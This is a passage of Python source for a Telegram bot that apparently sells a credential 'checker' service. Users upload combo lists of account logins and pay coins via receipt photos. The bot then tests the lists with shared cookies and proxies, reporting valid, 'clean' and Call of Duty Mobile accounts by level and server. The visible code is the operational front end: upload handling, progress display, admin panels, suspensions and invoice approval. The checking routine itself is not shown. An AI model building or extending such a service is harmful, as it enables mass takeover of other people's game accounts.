            with open(global_cookie, 'r') as f:
                cookie_content = f.read().strip()
        except:
            cookie_content = ""

        if not cookie_content:
            active_checks[user_id] = False
            for admin in ADMIN_IDS:
                try:
                    bot.send_message(admin, "⚠️ [ SYSTEM ALERT ]\n\nGlobal_Assets/cookies.txt is EMPTY or MISSING!\nUsers are currently blocked from checking.")
                except: pass
            
            markup = InlineKeyboardMarkup().row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="start_check_menu"))
            try:
                bot.edit_message_text("[ sʏsᴛᴇᴍ ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ ]\n\n• ᴛʜᴇ ʙᴏᴛ ɪs ᴛᴇᴍᴘᴏʀᴀʀɪʟʏ ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ ᴅᴜᴇ ᴛᴏ ᴍɪssɪɴɢ ʀᴇsᴏᴜʀᴄᴇs. ᴀᴅᴍɪɴs ʜᴀᴠᴇ ʙᴇᴇɴ ɴᴏᴛɪғɪᴇᴅ.", call.message.chat.id, call.message.message_id, reply_markup=markup)
            except: pass
            return
            
        if proxy_status == 'on':
            global_proxy = "Global_Assets/Proxy/Proxy.txt"
            try:
                with open(global_proxy, 'r') as f:
                    proxy_content = f.read().strip()
            except:
                proxy_content = ""
            
            if not proxy_content:
                for admin in ADMIN_IDS:
                    try:
                        bot.send_message(admin, "⚠️ [ SYSTEM ALERT ]\n\nProxy Management is ON, but Global_Assets/Proxy/Proxy.txt is EMPTY!\nThe check will continue but using local IP.")
                    except: pass

        ctype = file_info.get('checker_type', 'CODM')
        
        markup = InlineKeyboardMarkup()
        markup.row(InlineKeyboardButton("[ sᴛᴏᴘ ᴄʜᴇᴄᴋɪɴɢ ]", callback_data="stop_checking"))
        
        # Initial stats para sa bagong design
        total_accounts = len(lines) if 'lines' in locals() else 0 # Siguraduhin na nakuha mo na ang count ng lines
        
        initial_text = (
            "STATUS: 🔎 Analyzing…\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ [░░░░░░░░░░] 0%  0/{total_accounts:,}\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "✅ Valid      : 0\n"
            "❌ Invalid    : 0\n"
            "✨ Clean      : 0\n"
            "⚠️  Not Clean  : 0\n"
            "🎮 Has CODM   : 0\n"
            "📭 No CODM    : 0\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "📊 Level Distribution\n"
            "  1-50    : [░░░░░░░░░░] 0 (0%)\n"
            "  51-100  : [░░░░░░░░░░] 0 (0%)\n"
            "  101-150 : [░░░░░░░░░░] 0 (0%)\n"
            "  151-200 : [░░░░░░░░░░] 0 (0%)\n"
            "  201-250 : [░░░░░░░░░░] 0 (0%)\n"
            "  251-300 : [░░░░░░░░░░] 0 (0%)\n"
            "  301-350 : [░░░░░░░░░░] 0 (0%)\n"
            "  351+    : [░░░░░░░░░░] 0 (0%)\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🌏 Server Distribution\n"
            "  PH    : [░░░░░░░░░░] 0 (0%)\n"
            "  TH    : [░░░░░░░░░░] 0 (0%)\n"
            "  ID    : [░░░░░░░░░░] 0 (0%)\n"
            "  VN    : [░░░░░░░░░░] 0 (0%)\n"
            "  MY    : [░░░░░░░░░░] 0 (0%)\n"
            "  US    : [░░░░░░░░░░] 0 (0%)\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "Please Wait While Analyzing...\n"
            "𝕯𝖊𝖛: Saltpapi656"
        )
                       
        try:
            bot.edit_message_text(initial_text, call.message.chat.id, call.message.message_id, reply_markup=markup)
        except Exception: pass
        
        threading.Thread(target=bot_process_checker, args=(user_id, file_info['filepath'], call.message.chat.id, call.message.message_id, proxy_status, stop_event)).start()
        
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("UPDATE files SET status = 'Checked' WHERE id = ?", (file_id,))
            conn.commit()
            cursor.close()
            conn.close()
    
    elif call.data == "stop_checking":
        if user_id in stop_events:
            stop_events[user_id].set()
        stop_flags[user_id] = True 
        active_checks[user_id] = False
        try:
            bot.edit_message_text("[ ᴄʜᴇᴄᴋɪɴɢ sᴛᴏᴘᴘᴇᴅ ]\n\n• ʀᴇғᴜɴᴅs ᴡɪʟʟ ʙᴇ ᴘʀᴏssᴇᴅ ᴍᴏᴍᴇɴᴛᴀʀɪʟʏ.", call.message.chat.id, call.message.message_id, reply_markup=main_menu(user_id))
        except Exception: pass

    elif call.data == "admin_panel" and is_admin(user_id):
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("[ ᴜsᴇʀ ʟɪsᴛ ]", callback_data="admin_users"),
            InlineKeyboardButton("[ ɪɴᴠᴏɪᴄᴇs ]", callback_data="admin_invoices"),
            InlineKeyboardButton("[ sᴜsᴘᴇɴᴅ ᴜsᴇʀ ]", callback_data="admin_suspend"),
            InlineKeyboardButton("[ sᴜɴᴜsᴘᴇɴᴅ ᴜsᴇʀ ]", callback_data="admin_unsuspend"),
            InlineKeyboardButton("[ sᴇᴛᴛɪɴɢs ]", callback_data="admin_settings"),
            InlineKeyboardButton("[ ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ ]", callback_data="admin_announcement"),
            InlineKeyboardButton("[ ᴀᴅᴅ ᴄᴏɪɴs ]", callback_data="admin_add_coins")
        )
        markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="main_menu"))
        try:
            bot.edit_message_text("[ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ ]", call.message.chat.id, call.message.message_id, reply_markup=markup)
        except Exception:
            pass
            
    elif call.data == "admin_add_coins" and is_admin(user_id):
        markup = InlineKeyboardMarkup()
        markup.row(InlineKeyboardButton("[ ᴄᴀɴᴄᴇʟ ]", callback_data="admin_panel"))
        try:
            msg = bot.edit_message_text("ᴋɪɴᴅʟʏ ᴇɴᴛᴇʀ ᴛʜᴇ ᴜsᴇʀ ɪᴅ ᴏғ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴜsᴇʀ:", call.message.chat.id, call.message.message_id, reply_markup=markup)
            bot.clear_step_handler_by_chat_id(call.message.chat.id)
            bot.register_next_step_handler(msg, process_add_coins_userid)
        except Exception:
            pass

    # ==========================================
    # 📢 ADDED: ANNOUNCEMENT CALLBACK HANDLER
    # ==========================================
    elif call.data == "admin_announcement" and is_admin(user_id):
        markup = InlineKeyboardMarkup()
        markup.row(InlineKeyboardButton("[ ᴄᴀɴᴄᴇʟ ]", callback_data="admin_panel"))
        try:
            # Sinasagot ang callback para mawala ang loading spinner sa telegram button mo
            bot.answer_callback_query(call.id)
            
            # Babaguhin ang text ng admin panel para humingi ng mensahe
            msg = bot.edit_message_text("📢 **[ ᴀᴅᴍɪɴ ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ ]**\n\nᴋɪɴᴅʟʏ ᴇɴᴛᴇʀ ᴛʜᴇ ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ ᴍᴇssᴀɢᴇ:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
            
            # Ise-set up si next step handler para hintayin ang text na itatype mo
            bot.clear_step_handler_by_chat_id(call.message.chat.id)
            bot.register_next_step_handler(msg, process_admin_announcement)
        except Exception:
            pass

    elif call.data == "admin_settings" and is_admin(user_id):
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(InlineKeyboardButton("[ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ ]", callback_data="admin_maint"))
        markup.add(InlineKeyboardButton("[ ᴘʀᴏxʏ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ ]", callback_data="admin_proxy"))
        markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="admin_panel"))
        try:
            bot.edit_message_text("[ sᴇᴛᴛɪɴɢs ]", call.message.chat.id, call.message.message_id, reply_markup=markup)
        except Exception:
            pass

    elif call.data == "admin_maint" and is_admin(user_id):
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT setting_value FROM settings WHERE setting_key = 'maintenance'")
            maint_setting = cursor.fetchone()
            cursor.close()
            conn.close()
            
            status = maint_setting.get('setting_value', 'off') if maint_setting else 'off'
            
            markup = InlineKeyboardMarkup(row_width=1)
            markup.add(
                InlineKeyboardButton("[ ᴛᴜʀɴ ᴏɴ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ]", callback_data="maint_on"),
                InlineKeyboardButton("[ ᴛᴜʀɴ ᴏғғ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ]", callback_data="maint_off")
            )
            markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="admin_settings"))
            try:
                bot.edit_message_text(f"[ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ ]\n\n• ᴄᴜʀʀᴇɴᴛ sᴛᴀᴛᴜs: {status.upper()}", call.message.chat.id, call.message.message_id, reply_markup=markup)
            except Exception:
                pass

    elif call.data.startswith("maint_") and is_admin(user_id):
        action = call.data.split("_")[1]
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("UPDATE settings SET setting_value = ? WHERE setting_key = 'maintenance'", (action,))
            conn.commit()
            cursor.close()
            conn.close()
        try:
            bot.answer_callback_query(call.id, f"ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ ᴛᴜʀɴᴇᴅ: {action.upper()}")
        except Exception:
            pass
        call.data = "admin_maint"
        callback_handler(call)
        
    elif call.data == "admin_proxy" and is_admin(user_id):
        conn = get_db()
        proxy_status = 'off'
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT setting_value FROM settings WHERE setting_key = 'proxy_status'")
            res = cursor.fetchone()
            if res:
                proxy_status = res.get('setting_value', 'off')
            cursor.close()
            conn.close()
        
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton("[ ᴛᴜʀɴ ᴏɴ ᴘʀᴏxʏ ]", callback_data="proxy_on"),
            InlineKeyboardButton("[ ᴛᴜʀɴ ᴏғғ ᴘʀᴏxʏ ]", callback_data="proxy_off")
        )
        markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="admin_settings"))
        try:
            bot.edit_message_text(f"[ ᴘʀᴏxʏ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ ]\n\n• ᴄᴜʀʀᴇɴᴛ sᴛᴀᴛᴜs: {proxy_status.upper()}", call.message.chat.id, call.message.message_id, reply_markup=markup)
        except Exception:
            pass

    elif call.data.startswith("proxy_") and is_admin(user_id):
        action = call.data.split("_")[1]
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("UPDATE settings SET setting_value = ? WHERE setting_key = 'proxy_status'", (action,))
            conn.commit()
            cursor.close()
            conn.close()
        try:
            bot.answer_callback_query(call.id, f"ᴘʀᴏxʏ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ ᴛᴜʀɴᴇᴅ: {action.upper()}")
        except Exception:
            pass
        call.data = "admin_proxy"
        callback_handler(call)

    elif call.data == "admin_users" and is_admin(user_id):
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM users LIMIT 50") 
            users = cursor.fetchall()
            cursor.close()
            conn.close()
            
            markup = InlineKeyboardMarkup(row_width=2)
            buttons = []
            for u in users:
                buttons.append(InlineKeyboardButton(f"{u.get('username', 'Unknown')} {u.get('user_id', '')}", callback_data=f"ad_u_{u.get('user_id', '')}"))
            markup.add(*buttons)
            markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="admin_panel"))
            bot.edit_message_text("[ ᴜsᴇʀ ʟɪsᴛ ]", call.message.chat.id, call.message.message_id, reply_markup=markup)
            
    elif call.data.startswith("ad_u_") and is_admin(user_id):
        target_id = call.data.split("_")[2]
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM users WHERE user_id = ?", (target_id,))
            u = cursor.fetchone()
            cursor.close()
            conn.close()
            
            if u:
                active_status = "ʜᴀs ᴀᴄᴛɪᴠᴇ ᴘʀᴏᴄᴇss" if active_checks.get(int(target_id), False) else "ɴᴏ ᴀᴄᴛɪᴠᴇ ᴘʀᴏᴄᴇss"
                text = f"[ ᴜsᴇʀ ᴅᴀᴛᴀ ]\n\n" \
                       f"• ᴜsᴇʀɴᴀᴍᴇ: {u.get('username', 'Unknown')}\n" \
                       f"• ᴜsᴇʀ ɪᴅ: {u.get('user_id', 'Unknown')}\n" \
                       f"• ᴄᴏɪɴs: {u.get('coins', 0)}\n" \
                       f"• ᴛᴏᴛᴀʟ ᴄʜᴇᴄᴋᴇᴅ: {u.get('total_checked', 0)}\n" \
                       f"• ᴘʀᴏᴄᴇss sᴛᴀᴛᴜs: {active_status}"
                markup = InlineKeyboardMarkup()
                markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="admin_users"))
                bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)
                
    elif call.data == "admin_invoices" and is_admin(user_id):
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM invoices ORDER BY created_at DESC LIMIT 30")
            invoices = cursor.fetchall()
            cursor.close()
            conn.close()
            
            markup = InlineKeyboardMarkup(row_width=2)
            buttons = []
            for inv in invoices:
                buttons.append(InlineKeyboardButton(f"ɪɴᴠᴏɪᴄᴇ: {inv.get('id', '')} | ᴜsᴇʀɴᴀᴍᴇ: {inv.get('username', '')} | sᴛᴀᴛᴜs: {inv.get('status', '')}", callback_data=f"ad_inv_{inv.get('id', '')}"))
            markup.add(*buttons)
            markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="admin_panel"))
            bot.edit_message_text("[ ᴀʟʟ ɪɴᴠᴏɪᴄᴇs ]", call.message.chat.id, call.message.message_id, reply_markup=markup)
            
    elif call.data.startswith("ad_inv_") and is_admin(user_id):
        inv_id = call.data.split("_")[2]
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM invoices WHERE id = ?", (inv_id,))
            inv = cursor.fetchone()
            cursor.close()
            conn.close()
            
            if inv:
                text = f"• ɪɴᴠᴏɪᴄᴇ: {inv.get('id', 'Unknown')}\n\n" \
                       f"• ᴜsᴇʀɴᴀᴍᴇ: {inv.get('username', 'Unknown')}\n" \
                       f"• ᴀᴍᴏᴜɴᴛ: {inv.get('amount_php', '0')} PHP\n" \
                       f"• ᴄᴏɪɴs ʀᴇᴏ̨ᴜᴇsᴛᴇᴅ: {inv.get('coins', '0')}\n" \
                       f"• sᴛᴀᴛᴜs: {inv.get('status', 'Unknown')}\n"
                markup = InlineKeyboardMarkup()
                markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="admin_invoices"))
                bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)
                
    elif call.data == "admin_suspend" and is_admin(user_id):
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM users WHERE suspended_until IS NULL OR suspended_until < ?", (datetime.now(),))
            users = cursor.fetchall()
            cursor.close()
            conn.close()
            
            markup = InlineKeyboardMarkup(row_width=2)
            buttons = []
            for u in users:
                buttons.append(InlineKeyboardButton(f"{u.get('username', 'Unknown')}", callback_data=f"sus_{u.get('user_id', '')}"))
            markup.add(*buttons)
            markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="admin_panel"))
            try:
                bot.edit_message_text("[ sᴜsᴘᴇɴᴅ ᴜsᴇʀ ]\n\n• sᴇʟᴇᴄᴛ ᴀ ᴜsᴇʀ ᴛᴏ sᴜsᴘᴇɴᴅ", call.message.chat.id, call.message.message_id, reply_markup=markup)
            except Exception:
                pass

    elif call.data.startswith("sus_") and is_admin(user_id):
        target_id = call.data.split("_")[1]
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("[ 1 ʜᴏᴜʀ ]", callback_data=f"sdur_{target_id}_1h"),
            InlineKeyboardButton("[ 6 ʜᴏᴜʀs ]", callback_data=f"sdur_{target_id}_6h"),
            InlineKeyboardButton("[ 12 ʜᴏᴜʀs ]", callback_data=f"sdur_{target_id}_12h"),
            InlineKeyboardButton("[ 1 ᴅᴀʏ ]", callback_data=f"sdur_{target_id}_1d"),
            InlineKeyboardButton("[ 3 ᴅᴀʏs ]", callback_data=f"sdur_{target_id}_3d"),
            InlineKeyboardButton("[ 6 ᴅᴀʏs ]", callback_data=f"sdur_{target_id}_6d"),
            InlineKeyboardButton("ᴄᴜsᴛᴏᴍ ᴅᴜʀᴀᴛɪᴏɴ", callback_data=f"sdur_{target_id}_custom")
        )
        markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="admin_suspend"))
        try:
            bot.edit_message_text("[ ᴄᴜsᴛᴏᴍ ᴅᴜʀᴀᴛɪᴏɴ ]\n\n• sᴇʟᴇᴄᴛ sᴜsᴘᴇɴsɪᴏɴ ᴅᴜʀᴀᴛɪᴏɴ.", call.message.chat.id, call.message.message_id, reply_markup=markup)
        except Exception:
            pass

    elif call.data.startswith("sdur_") and is_admin(user_id):
        parts = call.data.split("_")
        target_id = parts[1]
        duration = parts[2]
        
        if duration == "custom":
            try:
                msg = bot.edit_message_text("ᴇɴᴛᴇʀ ᴄᴜsᴛᴏᴍ ᴅᴜʀᴀᴛɪᴏɴ. ᴇx: 10ᴍ 2ʜ 1ᴅ.", call.message.chat.id, call.message.message_id)
                bot.clear_step_handler_by_chat_id(call.message.chat.id)
                bot.register_next_step_handler(msg, process_custom_suspend, target_id)
            except Exception:
                pass
        else:
            try:
                msg = bot.edit_message_text("ᴇɴᴛᴇʀ ᴛʜᴇ ʀᴇᴀsᴏɴ ғᴏʀ sᴜsᴘᴇɴsɪᴏɴ:", call.message.chat.id, call.message.message_id)
                bot.clear_step_handler_by_chat_id(call.message.chat.id)
                bot.register_next_step_handler(msg, process_suspend_reason, target_id, duration)
            except Exception:
                pass
                
    elif call.data == "admin_unsuspend" and is_admin(user_id):
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM users WHERE suspended_until > ?", (datetime.now(),))
            users = cursor.fetchall()
            cursor.close()
            conn.close()
            
            markup = InlineKeyboardMarkup(row_width=2)
            buttons = []
            for u in users:
                buttons.append(InlineKeyboardButton(f"{u.get('username', 'Unknown')}", callback_data=f"unsus_{u.get('user_id', '')}"))
            markup.add(*buttons)
            markup.row(InlineKeyboardButton("[ ʙᴀᴄᴋ ]", callback_data="admin_panel"))
            try:
                bot.edit_message_text("[ ᴜɴsᴜsᴘᴇɴᴅ ᴜsᴇʀ ]\n• sᴇʟᴇᴄᴛ ᴀ ᴜsᴇʀ ᴛᴏ ᴜɴsᴜsᴘᴇɴᴅ:", call.message.chat.id, call.message.message_id, reply_markup=markup)
            except Exception:
                pass

    elif call.data.startswith("unsus_") and is_admin(user_id):
        target_id = call.data.split("_")[1]
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("[ ᴄᴏɴғɪʀᴍ ]", callback_data=f"confunsus_{target_id}"),
            InlineKeyboardButton("[ ᴄᴀɴᴄᴇʟ ]", callback_data="admin_unsuspend")
        )
        try:
            bot.edit_message_text(f"ᴀʀᴇ ʏᴏᴜ sᴜʀᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴜɴsᴜsᴘᴇɴᴅ ᴜsᴇʀ: {target_id}", call.message.chat.id, call.message.message_id, reply_markup=markup)
        except Exception:
            pass

    elif call.data.startswith("confunsus_") and is_admin(user_id):
        target_id = call.data.split("_")[1]
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("UPDATE users SET suspended_until = NULL, suspend_reason = NULL WHERE user_id = ?", (target_id,))
            conn.commit()
            cursor.close()
            conn.close()
            
        try:
            bot.edit_message_text("ᴜsᴇʀ ʜᴀs ʙᴇᴇssғᴜʟʟʏ ᴜɴsᴜsᴘᴇɴᴅᴇᴅ.", call.message.chat.id, call.message.message_id, reply_markup=main_menu(user_id))
        except Exception:
            pass
        try:
            bot.send_message(target_id, "[ ɴᴏᴛɪᴄᴇ ]\n\n• ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs ʙᴇᴇɴ ᴜɴsᴜsᴘᴇɴᴅᴇᴅ, ʏᴏᴜ ᴄᴀɴ ɴᴏᴡ ᴜsᴇ ᴛʜᴇ ʙᴏᴛ ᴀɢᴀɪɴ.")
        except Exception:
            pass

    elif call.data.startswith("admin_approve_") and is_admin(user_id):
        inv_id = call.data.split("_")[2]
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM invoices WHERE id = ? AND status = 'Pending'", (inv_id,))
            inv = cursor.fetchone()
            if inv:
                cursor.execute("UPDATE invoices SET status = 'Approved' WHERE id = ?", (inv_id,))
                cursor.execute("UPDATE users SET coins = coins + ? WHERE user_id = ?", (inv.get('coins', 0), inv.get('user_id', 0)))
                conn.commit()
                original_text = call.message.caption or call.message.text or ""
                try:
                    bot.edit_message_caption(original_text + "\n\nAPPROVED", call.message.chat.id, call.message.message_id)
                except Exception as e:
                    pass
                try:
                    bot.send_message(inv.get('user_id'), f"[ ɴᴏᴛɪᴄᴇ ]\n\n• ʏᴏᴜʀ ᴘᴀʏᴍᴇɴᴛ ғᴏʀ {inv.get('amount_php')} ᴘʜᴘ, ʜᴀs ʙᴇᴇɴ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ ᴀᴘᴘʀᴏᴠᴇᴅ\n\n• {inv.get('coins')} ᴄᴏɪɴs ʜᴀᴠᴇ ʙᴇᴇɴ ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ʙᴀʟᴀɴᴄᴇ.")
                except:
                    pass
            cursor.close()
            conn.close()

    elif call.data.startswith("admin_decline_") and is_admin(user_id):
        inv_id = call.data.split("_")[2]
        original_text = call.message.caption or call.message.text or ""
        try:
            bot.edit_message_caption(original_text + "\n\nᴘᴇɴᴅɪɴɢ ᴅᴇᴄʟɪɴᴇ ʀᴇᴀsᴏɴ:", call.message.chat.id, call.message.message_id)
        except Exception as e:
            pass
        try:
            msg = bot.send_message(call.message.chat.id, "ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʀᴇᴀsᴏɴ ғᴏʀ ᴅᴇᴄʟɪɴᴇ:")
            bot.clear_step_handler_by_chat_id(call.message.chat.id)
            bot.register_next_step_handler(msg, process_decline_reason, inv_id)
        except Exception:
            pass

    elif call.data == "exit":
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except Exception:
            pass

def process_upload(message, checker_type="CODM"):
    user_id = message.from_user.id
    if message.content_type != 'document':
        try:
            bot.send_message(message.chat.id, "[ ᴜᴘʟᴏᴀᴅ ᴄᴀɴᴄᴇʟʟᴇᴅ ]\n\n• ʏᴏᴜ sᴇɴᴛ ᴀ ᴛᴇxᴛ ᴏʀ ᴜɴsᴜᴘᴘᴏʀᴛᴇᴅ ғᴏʀᴍᴀᴛ ɪɴsᴛᴇᴀᴅ ᴏғ ᴀ ғɪʟᴇ.", reply_markup=main_menu(user_id))
        except Exception: pass
        return

    if not message.document.file_name.endswith('.txt'):
        try:
            bot.send_message(message.chat.id, "[ ᴜᴘʟᴏᴀᴅ ᴄᴀɴᴄᴇʟʟᴇᴅ ]\n\n• ᴏɴʟʏ ᴛxᴛ ғɪʟᴇs ᴀʀᴇ ᴀʟʟᴏᴡᴇᴅ.", reply_markup=main_menu(user_id))
        except Exception: pass
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        user_dir = f"Containers/{user_id}/Combos/{checker_type}"
        os.makedirs(user_dir, exist_ok=True)
        file_path = os.path.join(user_dir, message.document.file_name)
        
        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)
            
        remove_duplicates_from_file(file_path)
        file_size = os.path.getsize(file_path)
        
        conn = get_db()
        if conn:
            cursor = conn.cursor()
            now = datetime.now()
            cursor.execute("INSERT INTO files (user_id, filename, filepath, date_uploaded, file_size, checker_type) VALUES (?, ?, ?, ?, ?, ?)",
                           (user_id, message.document.file_name, file_path, now, file_size, checker_type))
            conn.commit()
            cursor.close()
            conn.close()

        bot.send_message(message.chat.id, f"ғɪʟᴇ ᴜᴘʟᴏᴀᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ({checker_type})\n{message.document.file_name} ɪs ɴᴏᴡ ɪɴ ʏᴏᴜʀ ʟɪsᴛ.", reply_markup=main_menu(user_id))
    except Exception as e:
        try:
            bot.send_message(message.chat.id, f"ᴇʀʀᴏʀ ᴜᴘʟᴏᴀᴅɪɴɢ ғɪʟᴇ: {str(e)}", reply_markup=main_menu(user_id))
        except Exception: pass

def process_custom_order(message):
    try:
        amount = int(message.text.strip())
        if amount <= 210:
            bot.send_message(message.chat.id, "ᴀᴍᴏᴜɴᴛ ᴍᴜsᴛ ʙᴇ ʜɪɢʜᴇʀ ᴛʜᴀɴ 210 ᴘʜᴘ", reply_markup=main_menu(message.from_user.id))
            return
            
        base_coins = amount * 60
        bonus = int(base_coins * 0.10)
        coins = base_coins + bonus
        
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("[ ᴄᴏɴғɪʀᴍ ]", callback_data=f"confbuy_{amount}_{coins}"),
            InlineKeyboardButton("[ ᴄᴀɴᴄᴇʟ ]", callback_data="buy_coins")
        )
        bot.send_message(message.chat.id, f"[ ᴏʀᴅᴇʀ sᴜᴍᴍᴀʀʏ ]\n\n• ᴀᴍᴏᴜɴᴛ: {amount} ᴘʜᴘ\n• ᴄᴏɪɴs: {coins}\n\n• ᴅᴏ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴘʀᴏᴄᴇᴇᴅ?", reply_markup=markup)
    except ValueError:
        try:
            bot.send_message(message.chat.id, "ɪɴᴠᴀʟɪᴅ ᴀᴍᴏᴜɴᴛ. ᴋɪɴᴅʟʏ ᴇɴᴛᴇʀ ɴᴜᴍʙᴇʀs ᴏɴʟʏ.", reply_markup=main_menu(message.from_user.id))
        except Exception: pass

def process_receipt(message, amount, coins):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    if message.content_type != 'photo':
        try:
            bot.send_message(message.chat.id, "[ ᴄᴀɴᴄᴇʟʟᴇᴅ ]\n\n• ʏᴏᴜ ᴅɪᴅ ɴᴏᴛ sᴇɴᴅ ᴀ ᴘʜᴏᴛᴏ ᴏғ ᴛʜᴇ ʀᴇᴄᴇɪᴘᴛ.", reply_markup=main_menu(user_id))
        except Exception: pass
        return
        
    photo_id = message.photo[-1].file_id
    
    conn = get_db()
    inv_id = None
    if conn:
        cursor = conn.cursor()
        now = datetime.now()
        cursor.execute("INSERT INTO invoices (user_id, username, amount_php, coins, receipt_file_id, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                       (user_id, username, amount, coins, photo_id, now))
        conn.commit()
        inv_id = cursor.lastrowid
        cursor.close()
        conn.close()
        
    try:
        bot.send_message(message.chat.id, "[ ʀᴇᴏ̨ᴜᴇsᴛᴇ sᴜʙᴍɪᴛᴛᴇᴅ ]\n\nᴛʜɪs ᴄᴏɪɴ ʀᴇᴏ̨ᴜᴇsᴛ ɪs ʙᴇɪɴɢ ᴘʀᴏᴄᴇssᴇᴅ. ᴏɴᴄᴇ ᴏᴜʀ sʏsᴛᴇᴍ sᴇᴇs ʏᴏᴜʀ ᴘᴀʏᴍᴇɴᴛ, ʏᴏᴜʀ ʀᴇᴏ̨ᴜᴇsᴛ ᴡɪʟʟ ʙᴇ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ ᴀᴄᴄᴇᴘᴛᴇᴅ.", reply_markup=main_menu(user_id))
    except Exception: pass

    for admin_id in ADMIN_IDS:
        try:
            text = f"[ ɴᴇᴡ ɪɴᴠᴏɪᴄᴇ ʀᴇᴏ̨ᴜᴇsᴛ ]\n\n" \
                   f"• ᴜsᴇʀɴᴀᴍᴇ: {username}\n" \
                   f"• ᴜsᴇʀ ɪᴅ: {user_id}\n" \
                   f"• ᴀᴍᴏᴜɴᴛ: {amount} PHP\n" \
                   f"• ᴄᴏɪɴ ʀᴇᴏ̨ᴜᴇsᴛᴇᴅ: {coins}\n" \
                   f"• ɪɴᴠᴏɪᴄᴇs ɪᴅ: {inv_id}"
                   
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("[ ᴀᴘᴘʀᴏᴠᴇᴅ ]", callback_data=f"admin_approve_{inv_id}"),
                InlineKeyboardButton("[ ᴅᴇᴄʟɪɴᴇ ]", callback_data=f"admin_decline_{inv_id}")
            )
            bot.send_photo(admin_id, photo_id, caption=text, reply_markup=markup)
        except Exception as e:
            pass

def process_decline_reason(message, inv_id):
    reason = message.text
    conn = get_db()
    if conn:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM invoices WHERE id = ?", (inv_id,))
        inv = cursor.fetchone()
        if inv and inv.get('status') == 'Pending':
            cursor.execute("UPDATE invoices SET status = 'Declined', decline_reason = ? WHERE id = ?", (reason, inv_id))
            conn.commit()
            try:
                bot.send_message(message.chat.id, f"ɪɴᴠᴏɪᴄᴇ {inv_id} ᴅᴇᴄʟɪɴᴇᴅ.")
            except Exception: pass
            try:
